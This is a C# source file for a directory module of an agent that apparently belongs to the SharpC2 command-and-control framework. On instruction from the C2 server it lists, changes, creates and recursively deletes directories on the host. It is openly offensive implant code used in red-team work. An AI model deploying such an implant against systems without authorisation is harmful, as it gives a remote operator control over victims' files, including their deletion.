using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Agent.Modules
{
    class DirectoryModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Dir",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Print",
                        Delegate = PrintWorkingDirectory
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Change",
                        Delegate = ChangeCurrentDirectory
                    },
                    new ModuleInfo.Command
                    {
                        Name = "List",
                        Delegate = ListDirectory
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Remove",
                        Delegate = RemoveDirectory
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Create",
                        Delegate = CreateDirectory
                    }
                }
            };
        }

        void PrintWorkingDirectory(string AgentID, C2Data C2Data)
        {
            try
            {
                var result = GetCurrentDirectory;
                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ChangeCurrentDirectory(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
                Directory.SetCurrentDirectory(path);

                var result = GetCurrentDirectory;
                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ListDirectory(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
                
                if (string.IsNullOrEmpty(path))
                {
                    path = GetCurrentDirectory;
                }

                var result = new SharpC2ResultList<FileSystemEntryResult>();

                foreach (var directory in Directory.GetDirectories(path))
                {
                    var info = new DirectoryInfo(directory);
                    result.Add(new FileSystemEntryResult
                    {
                        Size = string.Empty,
                        Type = "dir",
                        LastModified = info.LastWriteTimeUtc,
                        Name = info.Name
                    });
                }

                foreach (var file in Directory.GetFiles(path))
                {
                    var info = new FileInfo(file);
                    result.Add(new FileSystemEntryResult
                    {
                        Size = Helpers.ConvertFileLength(info.Length),
                        Type = "fil",
                        LastModified = info.LastWriteTimeUtc,
                        Name = info.Name
                    });
                }

                Agent.SendMessage(result.ToString());
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void RemoveDirectory(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var directory = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
                Directory.Delete(directory, true);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void CreateDirectory(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var directory = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
                Directory.CreateDirectory(directory);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        string GetCurrentDirectory
        {
            get { return Directory.GetCurrentDirectory(); }
        }
    }
}